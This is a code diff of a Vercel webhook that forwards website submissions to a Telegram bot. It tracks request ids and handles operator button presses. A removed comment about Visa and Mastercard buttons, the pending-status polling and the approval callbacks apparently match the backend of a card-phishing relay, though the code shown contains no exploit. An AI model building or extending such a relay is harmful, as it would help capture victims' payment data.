@@ -1,14 +1,15 @@
 // api/webhook.js - TODAS las claves están en Vercel
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET; // Solo para el webhook
+const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// 🔒 DOMINIOS PERMITIDOS (solo los tuyos)
+// 🔒 DOMINIOS PERMITIDOS (ACTUALIZADO con tu dominio)
 const ALLOWED_ORIGINS = [
-    'https://tu-dominio.vercel.app',
-    'https://tu-dominio.com',
-    'http://localhost:3000' // Para desarrollo
+    'https://www.libtradiocol.online',  // ✅ Tu dominio principal
+    'https://libtradiocol.online',       // ✅ Sin www
+    'http://localhost:3000',             // Para desarrollo
+    'https://libtradiocol.vercel.app'    // Si usas Vercel directamente
 ];
 
 // 📊 Rate limiting
@@ -27,7 +28,7 @@ function checkRateLimit(ip) {
         return true;
     }
     
-    if (data.count > 20) { // 20 peticiones por minuto
+    if (data.count > 20) {
         return false;
     }
     
@@ -63,7 +64,7 @@ export default async function handler(req, res) {
     }
 
     // ============================================
-    // 3. RATE LIMITING (evita ataques)
+    // 3. RATE LIMITING
     // ============================================
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     if (!checkRateLimit(ip)) {
@@ -82,6 +83,8 @@ export default async function handler(req, res) {
             const host = req.headers.host;
             const webhookUrl = `${protocol}://${host}/api/webhook`;
             
+            console.log('🔗 Configurando webhook en:', webhookUrl);
+            
             await fetch(`${TELEGRAM_API}/deleteWebhook`);
             
             const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
@@ -94,18 +97,33 @@ export default async function handler(req, res) {
             });
 
             const data = await response.json();
+            console.log('✅ Webhook configurado:', data);
+            
             return res.status(200).json({
                 success: true,
                 webhookUrl: webhookUrl,
                 telegramResponse: data
             });
         } catch (error) {
+            console.error('❌ Error configurando webhook:', error);
             return res.status(500).json({ error: 'Error configurando webhook' });
         }
     }
 
     // ============================================
-    // 5. POST - Procesar mensajes (SIN verificar x-api-key)
+    // 5. GET - Verificar estado
+    // ============================================
+    if (req.method === 'GET' && req.query.check) {
+        const solicitudId = req.query.check;
+        // Aquí iría tu lógica para verificar estado
+        return res.status(200).json({ 
+            solicitudId: solicitudId,
+            estado: 'pending'
+        });
+    }
+
+    // ============================================
+    // 6. POST - Procesar mensajes
     // ============================================
     if (req.method === 'POST') {
         try {
@@ -116,7 +134,6 @@ export default async function handler(req, res) {
             if (body.mensaje && !body.solicitudId) {
                 console.log('📨 Mensaje simple:', body.mensaje);
                 
-                // Enviar a Telegram usando las variables de entorno
                 const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -136,7 +153,7 @@ export default async function handler(req, res) {
                 });
             }
 
-            // CASO 2: Mensaje con botones (Visa, Mastercard, etc.)
+            // CASO 2: Mensaje con botones
             if (body.mensaje && body.solicitudId && body.botones) {
                 console.log('📨 Mensaje con botones:', body.solicitudId);
                 
@@ -171,7 +188,36 @@ export default async function handler(req, res) {
 
             // CASO 3: Callback query (botón presionado en Telegram)
             if (body.callback_query) {
-                // ... tu código para manejar callbacks
+                const callbackData = body.callback_query.data;
+                const callbackId = body.callback_query.id;
+                const message = body.callback_query.message;
+                const chatId = message.chat.id;
+                const messageId = message.message_id;
+                
+                console.log('🔘 Callback recibido:', callbackData);
+                
+                // Responder al callback
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: callbackId,
+                        text: 'Procesado ✅'
+                    })
+                });
+                
+                // Actualizar el mensaje
+                await fetch(`${TELEGRAM_API}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        message_id: messageId,
+                        text: `✅ ${callbackData} procesado correctamente`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
                 return res.status(200).json({ success: true });
             }
 
